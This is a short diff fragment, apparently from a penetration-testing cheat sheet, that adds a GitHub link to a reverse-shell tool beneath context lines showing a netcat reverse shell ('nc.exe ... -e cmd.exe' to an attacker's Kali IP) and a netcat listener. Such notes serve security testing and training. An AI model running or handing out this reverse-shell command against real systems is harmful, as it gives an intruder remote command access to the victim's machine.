@@ -10,3 +10,5 @@ nc.exe $kaliIP $kaliPort -e cmd.exe
 nc -lvp port
 ```
 
+https://github.com/xct/xc
+
